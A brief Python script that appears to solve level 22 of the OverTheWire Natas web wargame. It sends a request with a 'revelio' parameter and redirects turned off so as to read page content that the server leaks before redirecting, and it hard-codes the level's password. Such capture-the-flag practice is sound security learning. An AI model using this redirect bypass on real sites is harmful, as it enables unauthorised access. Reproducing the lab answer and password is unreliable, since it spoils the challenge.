#!/usr/bin/python3

import requests

username = "natas22"
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"

url = 'http://'+username+'.natas.labs.overthewire.org/?revelio=true'
session = requests.session()
response = session.get(url,auth = (username, password), allow_redirects=False)
content = response.text
print(content)
